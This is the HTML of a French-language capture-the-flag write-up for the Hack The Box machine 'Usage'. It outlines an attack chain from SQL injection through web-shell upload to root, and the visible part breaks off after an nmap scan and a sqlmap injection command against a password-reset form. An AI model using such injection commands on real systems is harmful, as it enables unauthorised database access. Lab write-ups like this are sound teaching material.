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"/></defs><style/><use id="Background" href="#img1" x="88" y="16"/></svg></a></li><li><a href=https://www.root-me.org/sl0wguy target=_blank title=RootMe rel=me><svg version="1.2" viewBox="0 0 500 500" width="500" height="500"><title>logo-rootme</title><style>.s0{fill:#fff}.s1{fill:#686868}</style><g id="Calque_2"/><g id="g13"><path id="path5" class="s0" d="m252.5 390.4c-.2-.2-.4-.4-.4-.6-.2-.2-.2-.2-.4-.4-.2.0-.2-.2-.4-.2-.2-.1-.3-.1-.5-.3-.2.0-.4-.2-.6-.2s-.4-.2-.4-.2c-.2.0-.4.0-.5-.2q-.3.0-.6.0-.3.0-.6.0-.3.0-.5.0-.3.0-.6.0c-.2.0-.4.0-.6.2-.2.0-.4.2-.4.2-.1.0-.3.2-.5.2s-.4.2-.6.3c-.2.0-.2.2-.4.2-.2.2-.2.2-.4.4-.1.2-.3.4-.3.4l-15.4 19.1c-1.8 2.5-1.5 5.9 1 7.8.9.7 2.3 1.1 3.4 1.1 1.7.0 3.2-.8 4.3-2.1l.2-.2c5.7-7 16.3-7 21.8.0l.2.2c1.1 1.3 2.6 2.1 4.3 2.1 1.2.0 2.5-.4 3.4-1.1 2.5-1.9 2.9-5.5 1-7.8z"/><path id="path7" class="s0" d="m226.9 67.2c-7.7.0-14.2 6.1-14.5 13.9l-29 10.5c-1.5.6-2.6 1.9-2.6 3.6v18.4h-23.3c-1.7-6.2-7.2-10.8-14-10.8-7.9.0-14.6 6.4-14.6 14.6.0 7.9 6.5 14.5 14.6 14.5 6.8.0 12.3-4.5 14-10.7h27.1c2 0 3.7-1.7 3.7-3.8V97.9l25.6-9.5c2.4 4.8 7.4 8 12.8 8 8 0 14.6-6.5 14.6-14.6.2-7.9-6.4-14.6-14.4-14.6z"/><path id="path9" class="s1" d="m196.3 338.2c-4.7-1.7-9.3-3.4-13.6-5.3-3.3-1.5-6.5-3.1-9.5-4.6 7.2 7.2 24.6 20.1 43.3 20.5 1.2-1.4 2.1-2.7 2.9-4.4-2.9-.6-5.7-1.1-8.5-1.9-5.2-1.3-9.9-2.6-14.6-4.3z"/><path id="path11" class="s0" d="m433.7 206.1c0-8.9-.5-17.8-1.9-26.3.0-.6-.2-1.1-.2-1.7C420.1 103 363.2 41.3 288.2 24.9c-1.9-8.5-9.4-15-18.5-15-10.6.0-19.1 8.5-19.1 19.1.0 9.1 6.4 16.7 14.9 18.6v69.8c0 1.1.6 2.2 1.5 3 .6.4 1.4.6 2.1.6.4.0 1 0 1.3-.2l28-10.6c1.9 2.8 4.8 4.7 8.2 5.7v32.9c-14.2 17.4-31.8 33.1-50.5 47.1l-21.4-49.6c4-2.6 6.6-7 6.6-12.1.0-7.9-6.4-14.6-14.6-14.6-7.9.0-14.5 6.5-14.5 14.6.0 8 6.4 14.6 14.5 14.6.2.0.6.0.8.0l22.3 51.6c-13 9.5-26.5 18-39.7 25.8l-63.6-19.1c-.7-.2-1.5-.2-2.2.1l-19 7.4c-2.6-3.6-6.8-5.8-11.7-5.8-7.9.0-14.6 6.4-14.6 14.5.0 8 6.5 14.6 14.6 14.6 8 0 14.6-6.4 14.6-14.6.0-.5-.2-1.1-.2-1.7l17.8-7 55.4 16.7c-47.3 26.5-89.7 41.8-96.7 44.2l-3.4 1.2c-3-2.3-6.8-3.6-11-3.6q-.2.0-.5.0c-8.9-21-13.5-43.9-13.5-66.8.0-11.4 1.2-22.5 3.3-33.3h83c1.7 6.2 7.2 10.8 14 10.8 8 0 14.6-6.4 14.6-14.6.0-7.9-6.4-14.5-14.6-14.5-6.8.0-12.3 4.5-14 10.7h-81.3c15.3-62.2 64.5-112 128-126.7 3.5 5.5 9.5 9.2 16.3 9.2 10.6.0 19.1-8.5 19.1-19.1s-8.5-19.1-19.1-19.1c-9.3.0-16.8 6.7-18.7 15.2-83.4 18.9-144.6 94-144.6 181 0 24.8 5 49.6 14.6 72.3-3.6 3.4-5.7 8.3-5.7 13.6.0 8.5 5.5 15.5 13.1 18.2v74.5c0 1.3.4 2.7 1.1 3.8l4.2 2.8 56.6 40v47.6c0 4 3.2 7.2 7.1 7.2h189.2c4 0 7.2-3.2 7.2-7.2v-47.6l56.8-40 4.2-3c.7-1.1 1.1-2.4 1.1-3.8v-75.1c7-2.8 11.9-9.6 11.9-17.6.0-4.9-1.9-9.4-4.9-12.8 10-22.6 15.1-47.5 15.1-72.7zM218.8 22.8c1.7-1.9 4.2-3 6.8-3 5.1.0 9.3 4.1 9.3 9.2s-4.2 9.3-9.3 9.3c-1.9.0-3.6-.6-5.1-1.5-2.5-1.7-4.2-4.6-4.2-7.6.0-2.6 1-4.9 2.5-6.4zm41.6 6c0-5.1 4.2-9.2 9.3-9.2 2.6.0 4.9 1.1 6.6 2.8 1.5 1.7 2.5 3.8 2.5 6.2.0 3.1-1.5 5.9-4 7.6-1.5 1.2-3.2 1.7-5.3 1.7-4.9.2-9.1-4-9.1-9.1zm35.6 72.9c0 .5.2.9.2 1.3l-23.1 8.7V47.4c5.7-1 10.4-4.4 13.1-9.1 20.2 4.5 39.1 12.7 56 23.8-.2 28-11 53.8-28 77v-23.4c6.2-1.7 10.7-7.2 10.7-14 0-8-6.4-14.6-14.5-14.6-8 .2-14.4 6.6-14.4 14.6zM90.3 301.1c-2.2.0-4.3-1-6-2.3-1.9-1.7-3.2-4.1-3.2-6.8.0-1.1.2-2.3.5-3.2 1.4-3.4 4.8-5.9 8.5-5.9 1.7.0 3.3.6 4.6 1.3 2.6 1.6 4.5 4.6 4.5 8 0 1.7-.5 3.2-1.3 4.5-1.3 2.7-4.2 4.4-7.6 4.4zm316-28.2q-.9.0-1.7.0c-10.6.0-19.1 8.5-19.1 19.1.0 8.1 5.1 15.1 12.5 17.8v69.6l-59.6 42c-1.9 1.3-3.1 3.6-3.1 5.9v40.1c0 2.3-1.9 4.1-4.1 4.1H309c-2.2.0-4.1-1.8-4.1-4.1V453c0-3.8-2.7-7.2-6.5-7.6-4.3-.3-7.9 3.1-7.9 7.2v15c0 2.2-1.9 4.1-4.2 4.1h-27c-2.3.0-4.2-1.9-4.2-4.1v-22.2c0-3.7-2.6-7.1-6.4-7.5-4.4-.4-8 3-8 7.2v22.7c0 2.2-1.8 4.1-4.1 4.1h-27.1c-2.2.0-4.1-1.9-4.1-4.1V453c0-3.8-2.7-7.2-6.5-7.6-4.3-.3-7.9 3.1-7.9 7.2v15c0 2.2-1.9 4.1-4.2 4.1h-22.1c-2.3.0-4.2-1.9-4.2-4.1v-40.1c0-2.3-1.1-4.6-3-5.9l-59.4-42v-70.4c6.6-3 11.2-9.6 11.2-17.4.0-1.1-.2-2.3-.4-3.4 7.5-2.6 65.2-23.3 122-58.6 76.8-47.9 119.4-102.2 124.3-158 33.1 26.7 56 65.3 62.6 108.6-.9 94.8-166.1 153.2-167.8 153.8-.4.2-1.3.4-2.1.8-2-.4-4.1-.8-6.4-1.2-1.5-.4-3.2-.6-4.7-.9-2.5-.4-4.9-1-7.4-1.5-.4-.2-1-.2-1.3-.2q-1.5-.3-2.9-.6c-1.1-.2-2.2-.6-3.4-.8-2.6-.5-5.3-1.1-7.7-1.8-4.8-1.2-9.3-2.5-13.8-3.6-4.4-1.4-8.9-2.5-13.1-3.8-.2.0-.2.0-.4.0-3.2-1-6.2-1.9-9.2-3.1-1-.3-2.1-.7-3.1-.9-1.5-.6-2.8-.9-4.1-1.3-2.5-.8-4.8-1.5-6.8-2.5h-.2q-5.1-1.7-9.1-3.4c-2.9-1.1-5.3-2.1-7.2-2.8-1.9-1-3.6-1.5-4.5-2.1-1.2-.6-1.8-.8-1.8-.8s.4.6 1.2 1.4c.7.9 1.9 2.2 3.6 3.7 1.5 1.6 3.6 3.4 6 5.3 2.5 1.9 5.3 4 8.4 6.1h.1c-1.1 3.8-1.8 7.9-1.8 12.1.0 21.8 17.7 39.5 39.5 39.5 16.8.0 31.2-10.6 36.9-25.5 1.9.2 4 .4 5.9.6 3.4.2 6.6.2 9.6.2.2.0.4.1.6.1l31.9 32.6c8.2 8.1 20.9 9.4 30.3 3.2l50-28c4.3-2.8 7.2-7.8 7.2-13v-57.6c19.2-15.3 36.7-33.5 48-54.1q-3.1 22.4-11.9 42.6zm5.7 24.6c-1.7 2.1-4.4 3.6-7.2 3.6-2.7.0-4.9-1.1-6.6-2.9-1.6-1.7-2.5-3.7-2.5-6.2.0-4 2.5-7.4 6-8.5 1-.4 2.1-.6 3.3-.6 4.3.0 8.1 3.2 9 7.4.2.6.2 1.1.2 1.9-.3 1.9-1.1 3.8-2.2 5.3zm-192.6 46.9c-.8 1.5-1.9 3-2.9 4.4-4.5 5.3-11.3 8.7-18.9 8.7s-14.4-3.4-18.9-8.7c-3.8-4.4-5.9-10.1-5.9-16.1.0-1.5.2-2.9.4-4.4 3 1.5 6.2 3.1 9.5 4.6 4.3 1.9 8.9 3.8 13.6 5.3 4.7 1.7 9.6 3 14.6 4.3 2.8.8 5.6 1.3 8.5 1.9z"/></g></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#enumeration>Enumeration</a><ol><li><a href=#nmap>nmap</a></li></ol></li><li><a href=#foothold>Foothold</a><ol><li><a href=#usagehtb>usage.htb</a></li><li><a href=#sql-injection>SQL Injection</a></li><li><a href=#mysql---usage_blog>MySQL - usage_blog</a></li><li><a href=#crack-du-mdp>Crack du mdp</a></li><li><a href=#compte>Compte raj@raj.com</a></li><li><a href=#utilisateur-admin>Utilisateur Admin</a></li><li><a href=#crack-admin-password>Crack admin password</a></li><li><a href=#php-web-shell---dash-user>PHP web shell - dash user</a></li></ol></li><li><a href=#dash---xander>dash -> xander</a><ol><li><a href=#mmonit-service--user-password->mmonit service : user password ?</a></li><li><a href=#xander-user-pwned>Xander user pwned</a></li></ol></li><li><a href=#xander---root>xander -> root</a><ol><li><a href=#mysql-password>mysql password</a></li><li><a href=#backup-script-as-root>Backup script as root</a></li></ol></li><li><a href=#references>References</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/hackthebox/ style=background-color:#9fef00;color:#111>Hack The Box</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/usage-htb/>HTB | Usage</a></h2><h3 class=article-subtitle>Usage is an easy Linux machine that features a blog site vulnerable to SQL injection, which allows the administrator's hashed password to be dumped and cracked. This leads to access to the admin panel, where an outdated Laravel module is abused to upload a PHP web shell and obtain remote code execution. On the machine, plaintext credentials stored in a file allow SSH access as another user, who can run a custom binary as root. The tool makes an insecure call to 7zip, which is leveraged to read the root user's private SSH key and fully compromise the system.</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2024-08-08T00:00:00Z>Aug 08, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>22 minute read</time></div></footer></div></header><section class=article-content><table style=border:none;width:100%><tr><td style=border:none;text-align:center;vertical-align:middle;width:150px><img src=cover.png alt="Usage cover" width=120></td><td style=border:none;text-align:center;vertical-align:middle><table style="margin:auto;border-collapse:collapse;border:1px solid #ddd"><thead><tr><th style="padding:8px;border:1px solid #ddd;text-align:center">Machine name</th><th style="padding:8px;border:1px solid #ddd;text-align:center">OS</th><th style="padding:8px;border:1px solid #ddd;text-align:center">IP</th><th style="padding:8px;border:1px solid #ddd;text-align:center">Difficulty</th></tr></thead><tbody><tr><td style="padding:8px;border:1px solid #ddd;text-align:center">Usage</td><td style="padding:8px;border:1px solid #ddd;text-align:center">Linux</td><td style="padding:8px;border:1px solid #ddd;text-align:center">10.10.11.18</td><td style="padding:8px;border:1px solid #ddd;text-align:center">Easy</td></tr></tbody></table></td></tr></table><h2 id=enumeration>Enumeration</h2><h3 id=nmap>nmap</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nmap 10.10.11.18 -p80,22
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>22/tcp open  ssh
+</span></span><span class=line><span class=cl>80/tcp open  http
+</span></span></code></pre></td></tr></table></div></div><h2 id=foothold>Foothold</h2><h3 id=usagehtb>usage.htb</h3><p>On trouve une site web sur le port 80 de la machine, qui nous redirige vers : <strong>usage.htb</strong>. On ajoute alors le nom de domaine dans <strong>/etc/hosts</strong>.</p><h3 id=sql-injection>SQL Injection</h3><p>Sur le site web, on remarque une page de connexion. Il y a une section &ldquo;mot de passe oublié&rdquo;. Lorsqu&rsquo;on s&rsquo;y rend et qu&rsquo;on écrit une email avec un <code>'</code>, on remarque que le serveur affiche un message d&rsquo;erreur. L&rsquo;input semble vulnérable à une possible injection SQL. On utilise donc sqlmap pour vérifier cela :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -r request.txt --data<span class=o>=</span><span class=s2>&#34;_token=SPlfAxte0uocmjyWay8x9TCSAcphFEZMqPL4gIIh&amp;email=leopold&#34;</span> -p email --batch --level <span class=m>5</span> --risk <span class=m>3</span> --threads <span class=m>10</span> --dbs
+</span></span><span class=line><span class=cl>        ___
+</span></span><span class=line><span class=cl>       __H__
